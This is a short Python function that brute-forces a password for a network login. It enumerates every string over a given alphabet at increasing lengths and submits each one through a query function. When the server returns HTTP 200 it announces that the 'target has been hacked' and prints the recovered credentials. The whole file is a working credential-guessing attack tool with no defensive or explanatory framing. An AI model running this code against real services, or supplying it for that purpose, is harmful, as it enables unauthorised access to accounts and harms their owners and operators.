
def brute_force_password(alphabet, length, query, query_settings_dict, iter_number=0):
    server_login = query_settings_dict['server_login']
    net_protocol = query_settings_dict['net_protocol']
    net_node = query_settings_dict['net_node']
    net_port = query_settings_dict['net_port']
    net_path = query_settings_dict['net_path']
    alphabet_base = len(alphabet)
    attempt_number = 0
    while True:
        attempt_number += 1
        temp = iter_number
        password_brute_force = ''
        while temp != 0:
            rest = temp % alphabet_base
            temp = temp // alphabet_base
            password_brute_force = alphabet[rest] + password_brute_force
        password_brute_force = alphabet[0] * (length - len(password_brute_force)) + password_brute_force
        print(f'Attempt №: {attempt_number}    Current length: {length}    Current password: {password_brute_force}')
        status_code = query(net_protocol, net_node, net_port, net_path, server_login, password_brute_force)
        if status_code == 200:
            print()
            print('Success! Target has been hacked!')
            print(f'Target login: {server_login}    Target password: {password_brute_force}')
            return password_brute_force
        else:
            print(f'Status code: {status_code}')
        # здесь берется последний символ из alphabet
        if alphabet[-1] * length == password_brute_force:
            length += 1
            iter_number = 0
        else:
            iter_number += 1
